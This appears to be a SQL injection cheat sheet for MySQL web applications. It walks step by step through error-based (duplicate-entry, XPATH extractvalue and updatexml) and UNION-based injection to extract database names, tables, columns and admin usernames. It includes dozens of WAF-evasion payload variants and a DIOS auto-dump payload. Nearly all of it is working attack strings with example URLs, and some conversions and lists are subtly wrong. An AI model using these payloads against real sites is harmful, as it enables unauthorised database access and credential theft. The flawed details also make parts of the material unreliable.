## Bypassing Error message: The used SELECT statements have a different number of columns (First method)
Sometimes when you try to find which column is vulnerable via UNION based queries you will face this error:

```The used SELECT statements have a different number of columns```

Try the following payload to bypass the error message:  

**Retrieve database version:**  
```+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-```

Example: ```http://domain.com.br/index.php?id=1'+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-```  
Error Output includes the database version:  
>Duplicate entry '**5.7.29**-log:1' for key ''  

**Retrieve database name:**  
```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  

Example: ```http://domain.com.br/index.php?id=1'+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  

Error Output includes the database name:  
>Duplicate entry '**litoflex**~1' for key ''

**Retrieve tables:**  

First we convert the database name to 0xHEX: **litoflex** -> **0x6c69746f666c6578**

Given query will output the first table of the database:  
```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6c69746f666c6578+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  

Error output shows the first table name:  
>Duplicate entry '**username**~1' for key ''  

Given query will output the second table of the database:  
```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6c69746f666c6578+LIMIT+1,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  

Error output shows the first table name:  
>Duplicate entry '**password**~1' for key ''  

Given query will output the third table of the database:  
```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6c69746f666c6578+LIMIT+2,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  

Error output shows the first table name:  
>Duplicate entry '**id**~1' for key ''  

Do the same with but change the number in the payload to retrieve different tables: (+LIMIT+**0**,1)  
Change it to: (+LIMIT+**1**,1) then (+LIMIT+**2**,1)... to retrieve different table columns.

**Retrieve columns

Before going further, convert the database name, table name(s) into 0xHEX. This case I will dump columns inside **username** table.

Converting from string to 0xHEX:  
```
litoflex -> 0x6c69746f666c6578  
username -> 0x757365726e616d65
```
The given query will dump the first column inside **username** table. *NOTE:* Please replace the following hex values with your hex values.

```+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x757365726e616d65+AND+table_schema=0x6c69746f666c6578+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  

To dump the second column of **username** table, replace (+LIMIT+**0**,1) with (+LIMIT+**1**,1)  
To dump the third column of **username** table, replace (+LIMIT+**1**,1) with (+LIMIT+**2**,1)  and so on...

The first column is the one I am going to dump. Given query will output the data inside the first column: **admin_username**
Before going further, convert the database name, table name and column(s) 0xHEX. This case I will dump data inside **admin_username** column.  

Converting from string to 0xHEX:  
```
litoflex -> 0x6c69746f666c6578  
username -> 0x757365726e616d65
admin_username -> 0x61646d696e5f757365726e616d65
```

The final payload would be:  
```+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(admin_username)+AS+CHAR),0x7e))+FROM+litoflex.username+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```

The error will output the data that we aimed at.  

## Bypassing Error message: The used SELECT statements have a different number of columns (Second method + WAF Bypass)

The given query will find how many columns the database has:  

```http://domain.com.br/index.php?id=1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -```

The error shows that the database has 14 columns  
>Unknown column '**15**' in 'group statement'

Given queries finds which of 14 columns is vulnerable.

```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -```  
```https://domain.com.br/index.php?id=1& n=-19901' Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -```

Same payloads but built for WAF bypassing using UNION based queries:
```
    http://domain.com/index.php?id=1& n=19901' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %55nion(%53elect 1,2,3) 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1&+n=19901'+union+distinctROW+select+1,2,3,4,5,6,7,8,9,10,12,13,14--+-  
    http://domain.com/index.php?id=1& n=19901' #?uNiOn + #?sEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' + #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +un/**/ion+se/**/lect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +?UnI?On?+'SeL?ECT? 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901'(UnIoN)+(SelECT)+1,2,3,4,5,6,7,8,9,10,12,13,14--+-  
    http://domain.com/index.php?id=1& n=19901' +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %55nion(%53elect 1,2,3,4,5,6,7,8,9,10,12,13,14)-- -  
    http://domain.com/index.php?id=1& n=19901' /**//*!12345UNION SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /**//*!50000UNION SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /**/UNION/**//*!50000SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!50000UniON SeLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' union /*!50000%53elect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*--*/union/*--*/select/*--*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' union (/*!/**/ SeleCT */ 1,2,3,4,5,6,7,8,9,10,12,13,14)-- -  
    http://domain.com/index.php?id=1& n=19901' /*!union*/+/*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /**/uNIon/**/sEleCt/**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +%2F**/+Union/*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /**//*!union*//**//*!select*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!uNIOn*/ /*!SelECt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /**/union/*!50000select*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' 0%a0union%a0select%09 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %0Aunion%0Aselect%0A 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
    http://domain.com/index.php?id=1& n=19901' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' union+sel%0bect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' union(select(1),2,3)-- -  
    http://domain.com/index.php?id=1& n=19901' uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' +/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' uni%20union%20/*!select*/%20 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' union%23aa%0Aselect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /**/union/*!50000select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /^****union.*$/ /^****select.*$/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*union*/union/*select*/select+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' /*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' %252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
    http://domain.com/index.php?id=1& n=19901' AnD null UNiON SeLeCt 1,2,3,4,5,6,7,8,9,10,12,13,14;%00-- -  
    http://domain.com/index.php?id=1& n=19901' AnD null UNiON SeLeCt 1,2,3,4,5,6,7,8,9,10,12,13,14+--+-  
    http://domain.com/index.php?id=1& n=19901' And False Union Select 1,2,3,4,5,6,7,8,9,10,12,13,14+--+-  
```

The website should loads normally, showing us the number of the vulnerable column. In this case: **6**.  

**Retrieving the version of database:**  
```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,version(),7,8,9,10,11,12,13,14-- -```  

**Retrieving the database name:**  
```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,database(),7,8,9,10,11,12,13,14-- -```  

**Using DIOS payload to dump tables & columns automatically**

Click [here](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/Error%20Based%20SQLi/README.md#dumping-with-dios) to get DIOS Payloads, which we will use in the following payload. Simply copy DIOS and replace it with **paste_DIOS_here 

```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,paste_DIOS_here,7,8,9,10,11,12,13,14-- -```  

Example:
```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/,7,8,9,10,11,12,13,14-- -```  

**Retrieving tables & columns manually**  

The process and the payloads for manual injecting is exactly the same. Please [click here](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Error%20Based%20SQLi#dumping-with-the-traditional-method) to get more details.

## Bypassing Error message: The used SELECT statements have a different number of columns (Third method)

The third method consists on XPATH queries.

**Retrieving the database version:**

-Using XPATH extractvalue:  
```and extractvalue(0x0a,concat(0x0a,(select version())))-- -```  

-Using XPATH updatexml:  
```and updatexml(null,concat(0x0a,(select version())),null)-- -```  

Output error:  
>XPATH SYNTAX ERROR: '**5.0.35**'35  

**Retrieving the database name:**

-Using XPATH extractvalue:  
```and extractvalue(0x0a,concat(0x0a,(select database())))-- -```  

-Using XPATH updatexml:  
```and updatexml(null,concat(0x0a,(select database())),null)-- -```  

Output error:  
>XPATH SYNTAX ERROR: '**AUX_db**'35  

**Retrieving tables**  

Retrieve the first table:  

-Using XPATH extractvalue:  
```and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -```

-Using XPATH updatexml:  
```and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)-- -```

Output error:  
>XPATH SYNTAX ERROR: '**AUX_column1**'35  

Retrieve the second table (*NOTE:* Replace the bold number with bigger number to retrieve the other table [limit **0**,1]. For example, number 0 will retrieve the 1st table, number 1 will do the 2nd column, number 2 will do the 3nd column and so on:

-Using XPATH extractvalue:  
```and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)))-- -```

-Using XPATH updatexml:  
```and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)),null)-- -```

Output error:  
>XPATH SYNTAX ERROR: '**AUX_column2**'35  

**Retrieving columns**  

First, convert database and table's name into 0xHEX value:

```
database: AUX_db -> 0xa4155585f6462
table: AUX_column1 -> 0x4155585f636f6c756d6e31
```

-Using XPATH extractvalue:  
```and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f6462 and table_name=0x4155585f636f6c756d6e31 limit 0,1)))-- -```

-Using XPATH updatexml:  
```and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f6462 and table_name=0x4155585f636f6c756d6e31 limit 0,1)),null)-- -```

Output error:  
>XPATH SYNTAX ERROR: '**admin_username**'35  

**Retrieving data inside columns**

Before using the following 2 queries, make sure you replace the values with your correct values you got from the website:  

-Using XPATH extractvalue:  
```and extractvalue(0x0a,concat(0x0a,(select concat(admin_username) from AUX_db.AUX_column1 limit 0,1)))```

-Using XPATH updatexml:  
```and updatexml(0x0a,concat(0x0a,(select concat(admin_username) from AUX_db.AUX_column1 limit 0,1)))```
